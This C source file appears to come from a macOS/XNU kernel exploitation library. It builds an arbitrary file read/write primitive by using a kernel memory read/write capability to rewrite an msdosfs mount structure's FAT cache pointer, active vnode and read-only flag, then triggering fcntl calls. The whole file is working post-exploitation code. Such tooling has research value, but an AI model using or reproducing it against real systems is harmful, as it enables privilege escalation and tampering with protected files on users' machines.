//
//  vnode.c
//  libxe
//
//  Created by sreejith on 3/10/22.
//

#include <limits.h>

#include <sys/fcntl.h>

#include "util/vnode.h"
#include "util/msdosfs.h"
#include "util/log.h"
#include "util/assert.h"
#include "util/misc.h"
#include "memory/kmem.h"
#include "memory/kmem_msdosfs.h"
#include "allocator/small_mem.h"
#include "slider/kernel.h"
#include "xnu/proc.h"

#include "../external/msdosfs/msdosfs.h"


struct xe_util_vnode {
    xe_util_msdosfs_t msdosfs_util;
    int cctl_fd;
    uintptr_t msdosfs_mount;
};


xe_util_vnode_t xe_util_vnode_create(void) {
    xe_util_msdosfs_t msdosfs_util;
    int error = xe_util_msdosfs_mount(KMEM_MSDOSFS_DEFAULT_BASE_IMAGE, "mount", &msdosfs_util);
    xe_assert_err(error);
    
    char mount_point[PATH_MAX];
    xe_util_msdosfs_get_mountpoint(msdosfs_util, mount_point, sizeof(mount_point));
    
    char buffer[PATH_MAX];
    snprintf(buffer, sizeof(buffer), "%s/data1", mount_point);
    int cctl_fd = open(buffer, O_RDONLY);
    xe_assert(cctl_fd >= 0);
    int res = fcntl(cctl_fd, F_NOCACHE);
    xe_assert_cond(res, ==, 0);
    
    int mount_fd = xe_util_msdosfs_get_mount_fd(msdosfs_util);
    uintptr_t mount_vnode;
    error = xe_xnu_proc_find_fd_data(xe_xnu_proc_current_proc(), mount_fd, &mount_vnode);
    xe_assert_err(error);
    uintptr_t mount = xe_kmem_read_ptr(mount_vnode, TYPE_VNODE_MEM_VN_UN_OFFSET);
    uintptr_t msdosfs_mount = xe_kmem_read_ptr(mount, TYPE_MOUNT_MEM_MNT_DATA_OFFSET);
    
    xe_util_vnode_t util = malloc(sizeof(struct xe_util_vnode));
    util->msdosfs_util = msdosfs_util;
    util->cctl_fd = cctl_fd;
    util->msdosfs_mount = msdosfs_mount;
    
    return util;
}

void xe_util_vnode_flush_cache(xe_util_vnode_t util) {
    int error = fcntl(util->cctl_fd, F_FLUSH_DATA);
    xe_assert_err(error);
}

void xe_util_vnode_populate_cache(xe_util_vnode_t util) {
    int res = 0;
    int tries = 0;
    do {
        struct log2phys args;
        bzero(&args, sizeof(args));
        args.l2p_contigbytes = 16384 + random();
        args.l2p_devoffset = 16384 + random();
        res = fcntl(util->cctl_fd, F_LOG2PHYS_EXT, &args);
        tries++;
    } while (res == 0 && tries < 5);
    xe_assert_cond(res, ==, -1);
    xe_assert(errno == EIO || errno == E2BIG);
}

void xe_util_vnode_read(xe_util_vnode_t util, uintptr_t vnode, char* dst, size_t size) {
    xe_assert_cond(size, <=, UINT32_MAX);
    uintptr_t temp_mem;
    xe_allocator_small_mem_t allocator = xe_allocator_small_mem_allocate(size, &temp_mem);
    
    char mount[TYPE_MSDOSFSMOUNT_SIZE];
    xe_kmem_read(mount, util->msdosfs_mount, 0, sizeof(mount));
    
    uint64_t* pm_fat_cache = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET);
    uint32_t* pm_fat_cache_offset = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET_OFFSET);
    uint* pm_fatmult = (uint*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FATMULT);
    uint32_t* pm_block_size = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BLOCK_SIZE_OFFSET);
    uint64_t* pm_fat_active_vp = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_ACTIVE_VP_OFFSET);
    
    *pm_fat_cache = temp_mem;
    *pm_fat_cache_offset = INT32_MAX;
    *pm_block_size = (uint32_t)size;
    *pm_fatmult = 0;
    *pm_fat_active_vp = vnode;
    
    char backup[TYPE_MSDOSFSMOUNT_SIZE];
    xe_kmem_read(backup, util->msdosfs_mount, 0, sizeof(backup));
    
    xe_kmem_write(util->msdosfs_mount, 0, mount, sizeof(mount));
    xe_util_vnode_populate_cache(util);
    xe_kmem_write(util->msdosfs_mount, 0, backup, sizeof(backup));
    
    xe_kmem_read(dst, temp_mem, 0, size);
    xe_allocator_small_mem_destroy(&allocator);
}

void xe_util_vnode_write(xe_util_vnode_t util, uintptr_t vnode, const char* src, size_t size) {
    uintptr_t temp_mem;
    xe_allocator_small_mem_t allocator = xe_allocator_small_mem_allocate(size, &temp_mem);
    xe_kmem_write(temp_mem, 0, (void*)src, size);
    
    char mount[TYPE_MSDOSFSMOUNT_SIZE];
    xe_kmem_read(mount, util->msdosfs_mount, 0, sizeof(mount));
    
    uint64_t* pm_fat_cache = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET);
    uint32_t* pm_fat_cache_offset = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET_OFFSET);
    uint* pm_flags = (uint*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FLAGS_OFFSET);
    int* pm_fat_flags = (int*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_FLAGS_OFFSET);
    uint32_t* pm_block_size = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BLOCK_SIZE_OFFSET);
    uint64_t* pm_fat_active_vp = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_ACTIVE_VP_OFFSET);
    uint64_t* pm_sync_timer = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_SYNC_TIMER);
    
    *pm_fat_cache = temp_mem;
    *pm_fat_cache_offset = 0;
    *pm_block_size = (uint32_t)size;
    *pm_fat_active_vp = vnode;
    *pm_flags &= (~MSDOSFSMNT_RONLY);
    *pm_fat_flags = 1; // mark fat cache dirty
    *pm_sync_timer = 0;
    
    char backup[TYPE_MSDOSFSMOUNT_SIZE];
    xe_kmem_read(backup, util->msdosfs_mount, 0, sizeof(backup));
    
    xe_kmem_write(util->msdosfs_mount, 0, mount, sizeof(mount));
    xe_util_vnode_flush_cache(util);
    
    xe_kmem_write(util->msdosfs_mount, 0, backup, sizeof(backup));
    xe_allocator_small_mem_destroy(&allocator);
}

void xe_util_vnode_destroy(xe_util_vnode_t* util_p) {
    xe_util_vnode_t util = *util_p;
    close(util->cctl_fd);
    xe_util_msdosfs_unmount(&util->msdosfs_util);
    free(util);
    *util_p = NULL;
}
